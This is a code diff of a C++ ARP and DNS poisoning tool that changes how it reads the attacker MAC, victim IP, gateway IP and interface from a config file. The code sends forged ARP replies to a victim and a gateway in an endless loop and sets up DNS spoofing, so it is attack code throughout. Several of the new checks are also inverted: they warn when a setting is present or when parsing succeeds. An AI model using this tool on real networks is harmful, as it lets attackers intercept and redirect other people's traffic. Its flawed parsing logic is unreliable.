@@ -23,38 +23,55 @@ void dnsSpoof(NetworkEngine *net);
 void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
                   const unsigned char *packet);
 
-struct in_addr victimIp;  // get this from config file
-struct in_addr gatewayIp; // get this from config file
+// this is just the easiest way, probably move these later
+struct in_addr victimIp;
+struct in_addr gatewayIp;
 
 int main(int argc, const char *argv[]) {
     // Read strings from config file
     std::unordered_map<std::string, std::string> properties = getConfig("poisoner.conf");
+    std::unordered_map<std::string, std::string> domainsToPoison;
 
-    const char *interfaceName = properties["interfaceName"].c_str(); // get this from config file
-    std::unordered_map<std::string, std::string> domainsToPoison;    // get this from config file
+    // convert all the values from the config file to the correct format
+    unsigned char attackerMac[ETH_ALEN];
 
-    unsigned char attackerMac[ETH_ALEN]; // get this from config file
-    memcpy(attackerMac, properties["attackerMac"].c_str(), ETH_ALEN);
-    attackerMac[ETH_ALEN - 1] = 0; // Needs to be manually null-terminated
+    unsigned char *victimIpChar = (unsigned char *)&victimIp;
+    unsigned char *gatewayIpChar = (unsigned char *)&gatewayIp;
 
-    unsigned char victimMac[ETH_ALEN];  // get this from arp request
-    unsigned char gatewayMac[ETH_ALEN]; // get this from arp request
+    if (properties.find("attackerMac") != properties.end()) {
+        std::cerr << "please set attackerMac in config file" << std::endl;
+    }
 
-    struct arp_header victimArp;
-    struct arp_header gatewayArp;
-    struct arp_header arpRequestVictim;
-    struct arp_header arpRequestGateway;
+    if (properties.find("victimIp") != properties.end()) {
+        std::cerr << "please set victimIp in config file" << std::endl;
+    }
 
-    victimIp.s_addr = 0x1400a8c0;
-    gatewayIp.s_addr = 0x6400a8c0;
+    if (properties.find("gatewayIp") != properties.end()) {
+        std::cerr << "please set gatewayIp in config file" << std::endl;
+    }
 
-    // prepare the mac variables
-    memset(victimMac, 0, ETH_ALEN);
-    memset(gatewayMac, 0, ETH_ALEN);
+    if (sscanf(properties["attackerMac"].c_str(), "%x:%x:%x:%x:%x:%x", &attackerMac[0],
+               &attackerMac[1], &attackerMac[2], &attackerMac[3], &attackerMac[4],
+               &attackerMac[5])) {
+        std::cerr << "could not parse attackerMac" << std::endl;
+    }
 
+    if (sscanf(properties["victimIp"].c_str(), "%d.%d.%d.%d", &victimIpChar[0], &victimIpChar[1],
+               &victimIpChar[2], &victimIpChar[3])) {
+        std::cerr << "could not parse victimIp" << std::endl;
+    }
+
+    if (sscanf(properties["gatewayIp"].c_str(), "%d.%d.%d.%d", &gatewayIpChar[0], &gatewayIpChar[1],
+               &gatewayIpChar[2], &gatewayIpChar[3])) {
+        std::cerr << "could not parse gatewayIp" << std::endl;
+    }
+
+    // get the mac addresses using arp
     bool victimMacSet = false;
     bool gatewayMacSet = false;
-    NetworkEngine ipEngine(interfaceName);
+    unsigned char victimMac[ETH_ALEN];
+    unsigned char gatewayMac[ETH_ALEN];
+    NetworkEngine ipEngine(properties["interfaceName"].c_str());
 
     // start arp sniffing
     ipEngine.LoopCallbacks.clear();
@@ -85,6 +102,8 @@ int main(int argc, const char *argv[]) {
     ipEngine.startSniff("arp");
     std::cout << "arp sniff started" << std::endl;
 
+    struct arp_header arpRequestVictim;
+    struct arp_header arpRequestGateway;
     craftArpRequest(&victimIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequestVictim);
     craftArpRequest(&gatewayIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequestGateway);
 
@@ -118,9 +137,12 @@ int main(int argc, const char *argv[]) {
     std::cout << "dns sniffing started" << std::endl;
 
     // start arp poisoning
+    struct arp_header victimArp;
+    struct arp_header gatewayArp;
     forgeArp(attackerMac, &gatewayIp, victimMac, &victimIp, &victimArp);
     forgeArp(attackerMac, &victimIp, gatewayMac, &gatewayIp, &gatewayArp);
 
+    // infinite arp loop
     while (true) {
         ipEngine.sendArp(victimArp);
         ipEngine.sendArp(gatewayArp);
